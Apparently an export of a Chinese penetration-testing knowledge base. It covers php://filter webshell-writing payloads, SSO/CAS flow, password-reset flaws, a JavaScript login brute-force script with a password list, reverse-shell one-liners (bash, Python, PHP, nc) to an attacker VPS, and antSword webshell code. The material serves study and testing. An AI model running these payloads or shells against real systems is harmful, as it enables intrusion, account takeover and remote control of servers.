复合过滤链能够在一个路径上指定。详细使用这些参数可以参考具体范例 名称 描述 resource= 这个参数是必须的。它指定了你要筛选过滤的数据流。 read= 该参数可选。可以设定一个或多个过滤器名称，以管道符（|）分隔。 write= 该参数可选。可以设定一个或多个过滤器名称，以管道符（|）分隔。 任何没有以 read= 或 write= 作前缀 的筛选器列表会视情况应用于读或写链。 使用 根据上述介绍的 使用方法，使用如下测试代码，来进行测试 读取文件 # payload 明文读取 http://localhost/test.php?file1=testfile.txt # payload 编码读取，这里使用base64编码 http://localhost/test.php?file1=php://filter/read=convert.base64-encode/resource=testfile.txt 写入文件 # payload 明文写入 http://localhost/test.php?file2=testfile.txt&txt=123456+by+aaron # payload 编码写入，这里使用base64 编码 http://localhost/test.php?file2=php://filter/write=convert.base64-encode/resource=testfile.txt&txt=123456+by+aaron 分析 在了解了filter协议的情况下，我们来分析一下这个题，$content拼接了$data和base64_decode($_GET['data'])，在$data中，由于存在die()方法，而die() 函数的作用是输出一条消息，并退出当前脚本，意思是die()函数后的所有php代码都不生效，所以解这个题的核心是将$data变量污染，从而达到绕过die()函数，执行可控的php代码 0x1 base64 编码 base64 编码/解码原理 使用php://filter流的base64-decode方法，将$content解码，利用php base64_decode 函数特性去除die()函数 首先我们知道，base64编码中只包含64个字符(0-9,a-z,A-Z,+,/)，其中=为补位码也就是(000000) ，而PHP在解base64编码的时候，遇到不在其可识别的字符的时候，将会跳过这些字符，仅将合法字符组合成一个新的字符再解码 所以当$content被加上了 之后，就会有共计10个字符不能被识别而被忽略，最终被解码的字符只有phpdienophp，和我们传入的字符串phpdienophp字符串只有11个字节，base64解码为4字节一组，再算上我们需要编码两次的shell = UEQ5d2FIQWdjR2h3YVc1bWJ5Z3BPejgr(32字节)，首先传入的字符需要base64解码一次，所以UEQ5d2FIQWdjR2h3YVc1bWJ5Z3BPejgr解码为PD9waHAgcGhwaW5mbygpOz8+(24字节)，在filter的base64解码中，24+11=35，35 *6 mod 24 = -6 那么就是说还需要可被base64认识的1字节，这1字节只能添加在编码的shell前用来闭合前面的11字节字符，使其能够通过base64编码，即xPD9waHAgcGhwaW5mbygpOz8+,但是题目中对传入的参数进行base64解码了1次，那么垃圾数据应该填充在UEQ5d2FIQWdjR2h3YVc1bWJ5Z3BPejgr这里，这个双编码的字节数为32，解码后要多1位的话，那么就需要填充4个字节为36位（32/4*3=24，未填充的字符解码数，要能正常解码的情况下=> 24*9/6 = 36，解码出来的字符数为 36/4*3=27） 因为base64只识别64个字符，所以从000000-111111，而ascii码是00000000-11111111，从ascii -> base64 或者从 base64 - ascii 取最小公倍数24，所以是3字节1组编码，4字节1组解码 填充垃圾数据为aaaaUEQ5d2FIQWdjR2h3YVc1bWJ5Z3BPejgr，解码出来为i��PD9waHAgcGhwaW5mbygpOz8+,在这27位中，第2位，第3位不能被识别，那么filter的base64解码就只有25+11 = 36 位，然后就能利用成功了 那么对小马而言的话 // base64 双重编码 // UEQ5d2FIQWdaWFpoYkNna1gxQlBVMVJiSjJOdFpDZGRLVHNnUHo0PQ== // 56 位，遇到==需要丢掉，所以需要-2 则 第一次解码出来的位数为 56/4*3-2=40 // 40+11=51,需要1位垃圾数据或者5位，或者4n+4-51(n>=12) //垃圾数据aaaa解码出来3位，2位不可识别，只有1位可被识别 // 41+11=52 位 52/4*3=39 payload http://127.0.0.1/2.php?path=php://filter/write=convert.base64-decode/resource=shell.php&data=aaaaUEQ5d2FIQWdaWFpoYkNna1gxQlBVMVJiSjJOdFpDZGRLVHNnUHo0PQ== http://127.0.0.1/2.php?path=php://filter/write=convert.base64-decode/resource=shell.php&data=aaaaaaaaaaaaaaaaaaaaUEQ5d2FIQWdaWFpoYkNna1gxQlBVMVJiSjJOdFpDZGRLVHNnUHo0PQ== 0x2 字符串操作+base64组合拳 除了使用base64特性的方法外，我们还可以利用php://filter字符串处理方法来去除。我们观察一下，这个，实际上是一个XML标签，既然是XML标签，我们就可以利用strip_tags函数去除它，而php://filter刚好是支持这个方法的 编写如下测试代码即可查看 php://filter/read=string.strip_tags/resource=php://input 的效果： 可见，被去除了。但回到上面的题目，我们最终的目的是写入一个webshell，而写入的webshell也是php代码，如果使用strip_tags同样会被去除。 万幸的是，php://filter允许使用多个过滤器，我们可以先将webshell用base64编码。在调用完成strip_tags后再进行base64-decode。die函数在第一步被去除，而webshell在第二步被还原。 ?path=php://filter/write=string.strip_tags|convert.base64-decode/resource=shell.php&data=UEQ5d2FIQWdjR2h3YVc1bWJ5Z3BPejgr 0x3 ROT13 编码 原理和上面类似，核心是将die()函数去除。在经过rot13编码后会变成，在PHP不开启short_open_tag时，php不认识这个字符串，当然也就不会执行了 payload ?path=php://filter/write=string.rot13/resource=shell.php&data=PD9jdWMgY3VjdmFzYigpOz4= 其他利用 文件包含 文件包含漏洞顾名思义即：包含恶意代码或恶意内容达到一定的攻击效果。 在文件包含漏洞当中，因为php://filter可以对所有文件进行编码处理，所以常常可以使用php://filter来包含读取一些特殊敏感的文件（配置文件、脚本文件等）以辅助后面的漏洞挖掘。 测试代码 payload ?file=php://filter/read=convert.base64-encode/resource=test.php 通过指定末尾的文件，可以读取经base64加密后的文件源码，虽然不能直接获取到shell等，但能读取敏感文件危害也是挺大的。同时也能够对网站源码进行审计 payload 少read关键字 ，在绕waf的时候或许有用，我也记录一下吧 ?file=php://filter/convert.base64-encode/resource=test.php XXE php://filter之前最常出镜的地方是XXE。由于XXE漏洞的特殊性，我们在读取HTML、PHP等文件时可能会抛出此类错误parser error : StartTag: invalid element name。其原因是，PHP是基于标签的脚本语言，这个语法也与XML相符合，所以在解析XML的时候会被误认为是XML，而其中内容（比如特殊字符）又有可能和标准XML冲突，所以导致了出错。 那么，为了读取包含有敏感信息的PHP等源文件，我们就要先将“可能引发冲突的PHP代码”编码一遍，这里就会用到php://filter。 在XXE中，我们也可以将PHP等容易引发冲突的文件流用php://filter协议流处理一遍，这样就能有效规避特殊字符造成混乱。 测试代码 methodname; ?> ]> &abc; 参考链接 file_put_contents利用技巧(php://filter协议) 探索php://filter在实战当中的奇技淫巧 谈一谈php://filter的妙用 php:// 协议官方文档 Copyright © aaron 2023 all right reserved，powered by Gitbook该文章修订时间： 2023-08-27 15:53:09 "},"知识库/01.WEB安全/99.其他/06.单点登录SSO原理.html":{"url":"知识库/01.WEB安全/99.其他/06.单点登录SSO原理.html","title":"06.单点登录SSO原理","keywords":"","body":"简介 在企业发展初期，企业使用的系统很少，通常一个或者两个，每个系统都有自己的登录模块，运营人员每天用自己的账号登录，很方便。 但随着企业的发展，用到的系统随之增多，运营人员在操作不同的系统时，需要多次登录，而且每个系统的账号都不一样，这对于运营人员 来说，很不方便。于是，就想到是不是可以在一个系统登录，其他系统就不用登录了呢？这就是单点登录要解决的问题。 单点登录英文全称Single Sign On，简称就是SSO。它的解释是：在多个应用系统中，只需要登录一次，就可以访问其他相互信任的应用系统。 如上图所示，图中有4个系统，分别是Application1、Application2、Application3、和SSO。Application1、Application2、Application3没有登录模块，而SSO只有登录模块，没有其他的业务模块，当Application1、Application2、Application3需要登录时，将跳到SSO系统，SSO系统完成登录，其他的应用系统也就随之登录了。这完全符合我们对单点登录（SSO)的定义。 技术实现 普通认证机制 当用户在浏览器（Browser）中访问一个应用，这个应用需要登录，再填写完用户名和密码之后，完成登录认证。这时这个用户的Session中，登录状态为yes（已登录），同时服务端会发送Cookie到客户端，浏览器(Browser)就会写下（保存）一份Cookie，这个Cookie就是用户的唯一标识。下次用户再访问这个应用的时候，请求中就会携带Cookie，服务端会根据这个Cookie找到对应的Session，通过Session来判断这个用户是否登录。 同域下的单点登录 一个企业一般情况下只有一个域名，通过二级域名区分不同的系统。比如我们有个域名叫做：a.com，同时有两个业务系统分别为：app1.a.com和app2.a.com。我们要做单点登录（SSO），需要一个登录系统，叫做：sso.a.com 我们只要再sso.a.com登录，app1.a.com和app2.a.com也就登录了。通过上面的登录认证机制，我们可以知道，在sso.a.com中登录之后，其实是在sso.a.com的服务端的Session中记录了登录状态，同时在浏览器端的sso.a.com下写入了Cookie，那么我们怎么才能让app1.a.com和app2.a.com登录呢？这里存在两个问题 Cookie 是不能跨域的，Cookie的domain属性是sso.a.com，在给app1.a.com 和 app2.a.com发送请求是带不上的 sso、app1、app2 是不同应用，它们的session存在自己的应用内，是不共享的 那么这俩问题应该如何解决呢？ 针对第一个问题： SSO登录之后，可以将Cookie的域设置为一级域，即a.com，这样所有的子域系统都可以访问到顶域的Cookie。在我们设置Cookie的时候，只能设置顶域和自己的域，不能设置其他的域。比如：我们不能在自己的系统中给**baidu.com**的域设置Cookie。 针对第二个问题： 当在SSO系统登录了，这时再访问app1，Cookie也带到了app1的服务端（Server），app1的服务端怎么找到这个Cookie对应的Session呢？这里就要把3个系统的Session共享，如下图所示。共享Session的解决方案有很多，例如：Spring-Session。这样第2个问题也解决了 不同域下的单点登录 同域下的单点登录是巧用了Cookie顶域的特性。如果是不同域呢？不同域之间Cookie是不共享的，怎么办？ 这里我们就要说一说CAS流程了，这个流程是单点登录的标准流程。 CAS基本协议过程 名词解释 Ticket Grangting Ticket(TGT) ： TGT是CAS为用户签发的登录票据，拥有了TGT，用户就可以证明自己在CAS成功登录过。TGT封装了Cookie值以及此Cookie值对应的用户信息。用户在CAS认证成功后，CAS生成cookie（叫TGC），写入浏览器，同时生成一个TGT对象，放入自己的缓存，TGT对象的ID就是cookie的值。当HTTP再次请求到来时，如果传过来的有CAS生成的cookie，则CAS以此cookie值为key查询缓存中有无TGT，如果有的话，则说明用户之前登录过，如果没有，则用户需要重新登录。 Ticket-granting cookie(TGC)： 存放用户身份认证凭证的cookie，在浏览器和CAS Server间通讯时使用，并且只能基于安全通道传输（Https），是CAS Server用来明确用户身份的凭证。 Service ticket(ST) ： 服务票据，服务的惟一标识码 , 由 CASServer 发出（ Http 传送），用户访问Service时，service发现用户没有ST，则要求用户去CAS获取ST.用户向CAS发出获取ST的请求，CAS发现用户有TGT，则签发一个ST，返回给用户。用户拿着ST去访问service，service拿ST去CAS验证，验证通过后，允许用户访问资源 CAS Server： CASServer 负责完成对用户的认证工作 , 需要独立部署 , CAS Server 会处理用户名 /密码等凭证 (Credentials) 。 CAS Client： 负责处理对客户端受保护资源的访问请求，需要对请求方进行身份认证时，重定向到 CAS Server 进行认证。（原则上，客户端应用不再接受任何的用户名密码等 Credentials ）。 CAS Client 与受保护的客户端应用部署在一起，以 Filter 方式保护受保护的资源。 CAS 登录流程 步骤一 浏览器向CAS客户端发起登陆请求，CAS客户端生成“登陆URL”,并把浏览器重定向到该URL。 登陆URL:https://${cas-server-host}:${cas-server-port}/cas-server/login?service=${client-service-url} 其中 cas-server-host: cas认证服务器的域名 cas-server-port: cas认证服务器的port client-service-url: 用于登陆成功后，浏览器重定向的URL 步骤二 浏览器向“登陆URL”发起重定向请求，CAS服务端创建会话，把TGT（Ticket Granting Ticket）放入cookie，并返回登陆页面 步骤三 用户输入用户名和密码,然后提交登陆表单. CAS服务端通过登陆验证后，会生成一个ST(service ticket,简称ticket), 然后把浏览器重定向到${client-service-url}?ticket=${service-ticket} 步骤四 浏览器重定向到${client-service-url}?ticket=${service-ticket}发起重定向请求 步骤五 CAS客户端取出ticket，生成“ticket验证URL”,然后向\"ticket验证URL\"发起http GET请求 \"ticket验证URL\": http://${cas-server-host}:${cas-server-port}/cas-server/serviceValidate?ticket=${service-ticket}&service=${client-service-url} 步骤六 如果CAS服务器通过ticket的有效性检查，那么会返回类似如下格式的XML片段 AAAA 其中AAAA是登陆的用户名 否则返回： YYY 其中： XXX的可能取值是INVALID_REQUEST, INVALID_TICKET, INVALID_SERVICE, INTERNAL_ERROR YYY是错误描述信息 至此CAS的登陆流程结束 登陆成功后，CAS客户端应该在会话中保存登陆状态信息。CAS服务器通常在步骤 6会建立ticket和${client-service-url}的映射关系，以便在登出时通知其业务系统清除缓存中的状态信息 简易步骤 用户访问app系统，app系统是需要登录的，但用户现在没有登录。 跳转到CAS server，即SSO登录系统，以后CAS Server我们统一叫做SSO系统。 SSO系统也没有登录，弹出用户登录页。 用户填写用户名、密码，SSO系统进行认证后，将登录状态写入SSO的session，浏览器（Browser）中写入SSO域下的Cookie。 SSO系统登录完成后会生成一个ST（Service Ticket），然后跳转到app系统，同时将ST作为参数传递给app系统。 app系统拿到ST后，从后台向SSO发送请求，验证ST是否有效。 验证通过后，app系统将登录状态写入session并设置app域下的Cookie。 至此，跨域单点登录就完成了。以后我们再访问app系统时，app就是登录的。接下来，我们再看看访问app2系统时的流程 用户访问app2系统，app2系统没有登录，跳转到SSO。 由于SSO已经登录了，不需要重新登录认证。 SSO生成ST，浏览器跳转到app2系统，并将ST作为参数传递给app2。 app2拿到ST，后台访问SSO，验证ST是否有效。 验证成功后，app2将登录状态写入session，并在app2域下写入Cookie。 SSO系统登录后，跳回原业务系统时，带了个参数ST，业务系统为什么还要拿ST再次访问SSO进行验证？登录认证通过后，为什么不能通过回调地址将用户信息返回给原业务系统，原业务系统直接设置登录状态 如果SSO没有登录，而是直接在浏览器中敲入回调的地址，并带上伪造的用户信息，业务系统会认为登录了，这里就存在票据伪造，所以业务系统还需要拿着ST再次访问SSO进行验证。 总结 单点登录（SSO系统）是保障各业务系统的用户资源的安全 。 各个业务系统获得的信息是，这个用户能不能访问我的资源。 单点登录，资源都在各个业务系统这边，不在SSO那一方。 用户在给SSO服务器提供了用户名密码后，作为业务系统并不知道这件事。 SSO随便给业务系统一个ST，那么业务系统是不能确定这个ST是用户伪造的，还是真的有效，所以要拿着这个ST去SSO服务器再问一下，这个用户给我的ST是否有效，是有效的我才能让这个用户访问 参考链接 https://developer.aliyun.com/article/636281 https://www.jianshu.com/p/8daeb20abb84 Copyright © aaron 2023 all right reserved，powered by Gitbook该文章修订时间： 2023-08-27 15:53:25 "},"知识库/01.WEB安全/99.其他/07.任意用户密码重置的10种姿势.html":{"url":"知识库/01.WEB安全/99.其他/07.任意用户密码重置的10种姿势.html","title":"07.任意用户密码重置的10种姿势","keywords":"","body":"任意用户密码重置的10种姿势 验证码不失效 造成原因 找回密码的时候获取的验证码缺少时间限制，仅判断了验证码的值是否正确，未判断验证码是否过期 测试方法 通过枚举找到真正的验证码完成验证 验证码直接返回 造成原因 直接输入目标手机号，点击获取验证码，并观察返回包即可 测试方法 输入手机号后点击获取验证码，验证码在客户端生成，并直接返回在Response以方便对接下来的验证码进行比对 验证码未绑定用户 造成原因 输入手机号和验证码进行重置密码的时候，仅对验证码是否正确进行了判断，未对该验证码是否与手机号匹配做验证 测试方法 在提交手机号和验证码的时候，替换手机号为他人手机号进行测试，成功通过验证并重置他人密码 修改接收的手机或邮箱 造成原因 用户名、手机号、验证码三者没有统一进行验证，仅判断了三者中的手机号和验证是否匹配和正确，如果正确则判断成功并进入下一流程。 测试方法 输入用户名获取验证码，修改接收验证码的手机号为自己的号码，自己手机成功接收验证码，提交到网站进行验证，验证成功并进入下一流程。 本地验证绕过 造成原因 客户端在本地进行验证码是否正确的判断，而该判断结果也可以在本地修改，最终导致欺骗客户端，误以为我们已经输入了正确的验证码。 测试方法 重置目标用户，输入错误验证码，修改返回包，把错误改为正确，即可绕过验证步骤，最终重置用户密码。 跳过验证步骤 造成原因 对修改密码的步骤，没有做校验，导致可以直接输入最终修改密码的网址，直接跳转到该页面，然后输入新密码达到重置密码的目的。 测试方法 首先使用自己的账号走一次流程，获取每个步骤的页面链接，然后记录页面3对应的输入新密码的链接，重置他人用户时，获取验证码后，直接输入页面3链接到新密码的界面，输入密码重置成功。 未效验用户字段的值 造成原因 在整个重置密码的流程中，只对验证码和手机号做了校验，未对后面设置新密码的用户身份做判断，导致在最后一步通过修改用户身份来重置他人的密码。 测试方法 使用自己的手机号走流程，在走到最后一个设置密码的流程时，修改数据包里的用户信息。 修改密码处ID可替换 造成原因 修改密码的时候，没有对原密码进行判断，且根据id的值来修改用户的密码，类似的SQL语句： update user set password=\"qwer1234\" where id = ‘1’ 修改数据包里的id的值，即可修改他人密码。 测试方法 修改自己用户密码，抓取数据包，替换数据包中用户对应的id值，即可修改他人的密码。 Cookie值的替换 造成原因 重置密码走到最后一步的时候仅判断唯一的用户标识cookie是否存在，并没有判断该cookie有没有通过之前重置密码过程的验证，导致可替换cookie重置他人用户密码。(cookie可指定用户获取。) 测试方法 重置自己用户密码到达最后阶段，抓到数据包，并在第一阶段重新获取目标用户cookie，替换cookie到我们抓取的数据包中，发包测试。 修改信息时替换字段 造成原因 在执行修改信息的sql语句的时候，用户的密码也当作字段执行了，而且是根据隐藏参数loginid来执行的，这样就导致修改隐藏参数loginid的值，就可以修改他人的用户密码。 测试方法 修改个人资料的时候，抓取数据包，然后来修改数据包的参数和对应的值，参数名一般可以在其他地方找到，替换隐藏参数即可修改他人的密码等信息。 视频地址 http://loudong.360.cn/School/content/id/214 大佬总结链接 http://www.sqlsec.com/2017/10/resetpass.html Copyright © aaron 2023 all right reserved，powered by Gitbook该文章修订时间： 2023-05-19 15:33:33 "},"知识库/01.WEB安全/99.其他/08.网页接口加密暴破.html":{"url":"知识库/01.WEB安全/99.其他/08.网页接口加密暴破.html","title":"08.网页接口加密暴破","keywords":"","body":"前言 平时测试的时候，可能会遇到一些接口（如登陆接口）中的某些数据是加密的，如下图： 一般的思路：通过逆向分析前端加密算法，拿到密钥，再写脚本模拟加密过程构造想要的数据 [!note] 上面的思路是常规的思路，如果代码存在混淆，则比较费时费力，甚至分析不出来 因为加密都是在前端执行的，那么我们只需要模拟前端的操作即可 此处抛开burp插件不谈 解决办法 通过js模拟操作即可 定位输入框和按钮 设置数据 点击按钮 分析代码，找到我们要输入的框 然后定位到数据，有jquery的话会方便很多，没有就使用原生的js也不影响 document.getElementsByName(\"username\")[0] document.getElementsByName(\"password\")[0] document.getElementsByClassName(\"btn btn-primary btn-block\")[0] 如果不好找，可以直接编辑html，手动添加id属性 然后再通过id进行定位 document.getElementById(\"testusername\") 定位后该插入数据的就插入数据，该点击的就点击，具体看下面的实现代码 实现代码 var usernames = new Array('13299999999','13333333333','18888888888','13000000000'); var passwords = new Array('qwe123','root','toor','admin','admin123','admin666','admin888','123456','12345','1234','123','12','1','administrator','administrators','admin123456','admin12345','admin1234','admin12','admin1','phpcms','jyxy','asd123','xiaoyin','daxiong','ironport','111111','0','11111111','112233','123123','123321','12345678','654321','666666','888888','abcdef','abcabc','abc123','a1b2c3','test','aaa111','123qwe','qwerty','qweasd','password','p@ssword','passwd','iloveyou','5201314','monkey','1234567','letmein','trustno1','dragon','baseball','master','sunshine','ashley','bailey','passw0rd','shadow','superman','qazwsx','michael','football','xiaoming','qq123456','taobao','wang1234','zxc','changeme','654310','user','Password1','Password123','sql','sqlserver','server','webserver123','pos','kingdee','anypass','jie1982','database','sapassword','9876','sa123','p@ssw0rd','sa','1q2w3e','1q2w3e4r','1234qwer','8848','sasa','asas','9','99','999','9999','99999','999999','9999999','99999999','8','88','888','8888','88888','8888888','88888888','7','77','777','7777','77777','777777','7777777','6','66','666','6666','66666','5','55','555','5555','55555','555555','4','44','444','4444','44444','444444','4444444','3','33','333','3333','33333','333333','2','22','222','2222','22222','222222','11','111','1111','11111','manager','!@#$%^&*()','qwerty123456','zxcvbn123456','sa1','as','aa','aaa','abcd1234','aaaaaa','asdfghjkl;\\'','sa123456789','sasasasa','@#$%&*()','gsp','asdf','power','123@#','778899','13579','12344321','147258','!@#$%^','!@#123','!@#$%^&*()','123!@#','!@##@!','1q2w3e4r','1q2w3e4r5t','1qaz2wsx','1qazxsw2','1qaz2wsx3edc','a','admin75','asd','crm','chinanet','erp','hello','hr','iem','king','MEDIA','microsoft','mnbvcxz','mysql','mysteelsoft','plm','q1w2e3r4','qwertyuiop','r4e3w2q1','sa!@#','sa!@#$%^','sa123456','sapass','saas','sasasa','sql2008','sqlpass','sqlpassword','sqladmin','sys','system','sunny','tianya','zxcvbnm','ems','crm2006','crm2007','crm2008','crm2009','crm2010','hrsvr','sa20060876','golf','123456Aa','123456Ab','123456Ac','test123','WebLogic','free','user1','user12','user123','user1234','user12345','user123456','#NAME?','liuwei123','admin2006','neteye','Test123456','admin*123','ucenter','aa123456','h3capadmin','1234567890','boston','guest','phpmyadmin','fuckyou','7007','jyadmin','020php168','seeyon','111111111','nozuonodie','1\\'or\\'1\\'=\\'1','world','helloworld','manageradmin111111','manageradmin','adminmanager111111','adminmanager','123456qq','qazwsxedc','huangxiaoqin','123456a','huawei','ncportal','111000','1314520','\\'or\\'=\\'or\\'','default','enable','discuz','laixianjian','unvs123','wordpress','leolee','localhost','10000','neworiental','youyuan','zuods123','123***','tomcat','dba','zted888888','xunlei','110','120','114','119','apache','xcmcn123456','adminInfo','skyclass','XXOO','xuezhenhe','10086','10010','guanliyuan','yunwei','cctv6','cctv5','cctv4','cctv3','cctv2','cctv1','12306','12306caonima','ete123','server123','null','admin111','caonima','nimabi','mlgb','conadmin','1qaz!QAZ','TRUE','FALSE'); for (i in usernames) { document.getElementById(\"testusername\").value=usernames[i] for (j in passwords) { document.getElementById(\"testpassword\").value=passwords[j] document.getElementsByClassName(\"btn btn-primary btn-block\")[0].click() } } 效果： Copyright © aaron 2023 all right reserved，powered by Gitbook该文章修订时间： 2023-08-27 15:53:47 "},"知识库/01.WEB安全/99.其他/09.反弹shell.html":{"url":"知识库/01.WEB安全/99.其他/09.反弹shell.html","title":"09.反弹shell","keywords":"","body":"Shell 反弹 当拿到webshell的时候，因为webshell的环境是虚拟终端，不是交互型终端，很多命令是无法执行的，所以需要拿到交互式shell，就得反弹shell 工具准备 VPS(公网ip) python环境 nc(netcat) Ubuntu(宿主机) 反弹shell 步骤 首先在vps上使用netcat开启监听 nc -lvnp 8080 参数 -l：使用监听模式，监控传入的资料; -v：显示指令执行过程； -n：直接使用ip地址，而不通过域名服务器； -p：：设置本地主机使用的通信端口 测试 在Ubuntu上开启tcp8080端口，通过上图可以看见nc 监听了本地的8080端口，且是TCP协议 在监听机上(vps)上监听8080端口 bash反弹 bash -i >& /dev/tcp//8080 0>&1 bash -i ： 产生一个bash的交互环境； >&：将联合符号前面的内容与后面的内容相结合然后一起重定向给后者； /dev/tcp//8080：与目标主机ip/8080端口建立一个TCP连接； 0>&1：将标准输入与标准输出相结合，重定向到前面标准输出内容 python一句话反弹shell python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"\",8080));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);' 这样虽然反弹回来了，但是看不到用户是谁，此时可以使用python 一句话反弹用户 python -c \"import pty;pty.spawn('/bin/bash')\" python 脚本执行 import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect((\"\",8080)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); p=subprocess.call([\"/bin/sh\",\"-i\"]); 当拿到webshell权限之后，可以上传此脚本，只要目标服务器有python环境，即可执行此脚本，并在攻击机上反弹回shell 也可以将此脚本上传至攻击服务器上，使用wget 下载攻击机上的文件，然后再目标服务器上下载此文件(目标服务器有wget命令的情况下) 针对第二种方法介绍(由于第一种方法可以在菜刀，蚁剑等工具直接上传较简单) 首先在vps中开启Apache service apaache2 restart 将脚本放置在/var/www/html 目录下 在目标服务器上下载此脚本 wget http://ip/shell.py 在宿主机上执行shell.py（注意权限） PHP 一句话执行 要求宿主机上拥有php环境 php -r '$sock=fsockopen(\"\",8080);exec(\"/bin/sh -i &3 2>&3\");' PHP 脚本 \",8080);exec(\"/bin/sh -i &3 2>&3\");?> nc命令获取靶机的反弹shell rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 8080 >/tmp/f exec 反弹 0/dev/tcp//1024; sh &196 2>&196 webshell 下反弹shell 蚁剑连接webshell下 在webshell 下操作可行的有 python 脚本执行 PHP 脚本 Copyright © aaron 2023 all right reserved，powered by Gitbook该文章修订时间： 2023-06-02 22:41:22 "},"知识库/01.WEB安全/99.其他/10.webshell原理.html":{"url":"知识库/01.WEB安全/99.其他/10.webshell原理.html","title":"10.webshell原理","keywords":"","body":"%pageLock% Webshell（PHP） 什么是webshell？ Webshell就是以asp、php、jsp或者cgi等网页文件形式存在的一种命令执行环境，也可以将其称做为一种网页后门。黑客通常会在入侵了一个网站后，将webshell与网站服务器WEB目录下正常的网页文件混在一起，用浏览器来访问webshell得到一个命令执行环境来控制服务器。 webshell的种类有哪些？ 单/少功能木马 能完成写入文件、列目录、执行系统命令等少量功能的WebShell，例如php中的system函数等 逻辑木马 利用系统逻辑漏洞或构造特殊，绕过访问控制或执行特殊功能的WebShell，例如利用php uaf漏洞构造的bypass disable_funtion马 一句话木马 可以在目标服务器上执行PHP代码，并和客户端（如菜刀，Cknife、冰蝎、蚁剑）进行交互的webshell，例如通过eval，assert函数执行php代码的方式，并使用webshell管理工具管理的木马 多功能木马 根据PHP语法，编写较多代码，并在服务器上执行，完成大量间谍功能的Webshell（大马） 其中，一句话木马原理如图所示： 客户端将PHP代码通过特殊参数名（password）,发送给放置在服务器上的一句话木马文件，一句话木马文件则在服务器上执行发来的PHP代码，然后将执行结果回传给客户端，客户端将结果解析并展示给操作者。 PHP 可执行系统命令的函数 system string system ( string $command [, int &$return_var ] ); # $command为执行的命令，&return_var可选，用来存放命令执行后的状态码 # system 函数执行有回显，可将结果显示在页面上 passthru void passthru ( string $command [, int &$return_var ] ); # 和system函数类似，$command为执行的命令，&return_var可选，用来存放命令执行后的状态码 # passthru 执行有回显，可将执行结果显示在页面上 exec string exec ( string $command [, array &$output [, int &$return_var ]] ); # $command是要执行的命令 # $output是获得执行命令输出的每一行字符串，$return_var用来保存命令执行的状态码（检测成功或失败） # exec()函数执行无回显，默认返回最后一行结果 shell_exec string shell_exec( string &command); # $command是要执行的命令 # shell_exec()函数默认无回显，通过 echo 可将执行结果输出到页面 # `(反引号) shell_exec() 函数实际上仅是反引号 (`) 操作符的变体，当禁用shell_exec时，` 也不可执行 # 在php中称之为执行运算符，PHP 将尝试将反引号中的内容作为 shell 命令来执行，并将其输出信息返回 popen resource popen ( string $command , string $mode ); # 函数需要两个参数，一个是执行的命令command，另外一个是指针文件的连接模式mode，有r和w代表读和写。函数不会直接返回执行结果，而是返回一个文件指针，但是命令已经执行。popen()打开一个指向进程的管道，该进程由派生给定的command命令执行而产生。返回一个和fopen()所返回的相同的文件指针，只不过它是单向的（只能用于读或写）并且必须用pclose()来关闭。此指针可以用于fgets()，fgetss()和 fwrite() proc_open resource proc_open ( string $cmd , array $descriptorspec , array &$pipes [, string $cwd [, array $env [, array $other_options ]]] ); # 与Popen函数类似，但是可以提供双向管道 pcntl_exec void pcntl_exec ( string $path [, array $args [, array $envs ]] ) # path是可执行二进制文件路径或一个在文件第一行指定了 一个可执行文件路径标头的脚本 # args是一个要传递给程序的参数的字符串数组。 # pcntl是linux下的一个扩展，需要额外安装，可以支持 php 的多线程操作。 # pcntl_exec函数的作用是在当前进程空间执行指定程序，版本要求：PHP > 4.2.0 antSword原理 一句话木马 首先在蚁剑添加手动代理，用于Burp抓包分析 // 临时关闭PHP的错误显示功能 @ini_set(\"display_errors\", \"0\"); // 设置执行时间，为零说明永久执行直到程序结束，是为了防止像dir、上传文件大马时超时。 @set_time_limit(0); // asenc方法，接收参数，返回参数 function asenc($out){ return $out; }; function asoutput(){ // 从缓冲区取出数据 $output=ob_get_contents(); // 清空缓冲区，并将缓冲区关闭 ob_end_clean(); echo \"b48a94c80a\"; // 输出数据 echo @asenc($output); echo \"606e3eed3\"; } // 打开缓冲区，来保存所有的输出 ob_start(); try{ // $_SERVER[\"SCRIPT_FILENAME\"]是获取当前执行脚本的绝对路径，dirname() 函数返回路径中的目录名称部分，也就是说$D是当前执行脚本所在的目录 $D=dirname($_SERVER[\"SCRIPT_FILENAME\"]); if($D==\"\") // $_SERVER[\"PATH_TRANSLATED\"]获取当前脚本所在文件系统（不是文档根目录）的基本路径。这是在服务器进行虚拟到真实路径的映像后的结果 $D=dirname($_SERVER[\"PATH_TRANSLATED\"]); // 拼接字符串和一个制表位 $R=\"{$D} \"; // 判断是否为Linux的文件目录 if(substr($D,0,1)!=\"/\"){ // 遍历盘符 foreach(range(\"C\",\"Z\")as $L) // 如果存在盘符 if(is_dir(\"{$L}:\")) // 拼接字符串 $R.=\"{$L}:\"; }else{ // 否则拼接/ $R.=\"/\"; } // 拼接制表位 $R.=\" \"; // 判断posix_getegid方法是否存在，存在调用该方法按用户id返回用户相关信息 $u=(function_exists(\"posix_getegid\"))?@posix_getpwuid(@posix_geteuid()):\"\"; // 如果用户信息不为空，则返回name属性，否则调用get_current_user()方法 $s=($u)?$u[\"name\"]:@get_current_user(); // 返回运行 PHP 的系统的有关信息 并拼接 $R.=php_uname(); $R.=\" {$s}\"; echo $R; ;} catch(Exception $e){ // 捕获异常 echo \"ERROR://\".$e->getMessage(); }; // 运行程序 asoutput(); die(); // posix_getpwuid — Return info about a user by user id posix_getpwuid ( int $uid ) : array // posix_geteuid — Return the effective user ID of the current process posix_geteuid ( void ) : int 将此代码放置在eval函数中执行，返回结果如下图所示： 当使用列目录等命令抓包分析如下： @ini_set(\"display_errors\", \"0\"); @set_time_limit(0); function asenc($out){ return $out; }; function asoutput(){ $output=ob_get_contents(); ob_end_clean(); echo \"7322e6777\"; echo @asenc($output); echo \"7529076fb4d2\"; } ob_start(); try{ $D=base64_decode($_POST[\"od0d1a967133cb\"]); $F=@opendir($D); if($F==NULL){ echo(\"ERROR:// Path Not Found Or No Permission!\"); }else{ $M=NULL; $L=NULL; while($N=@readdir($F)){ $P=$D.$N; $T=@date(\"Y-m-d H:i:s\",@filemtime($P)); 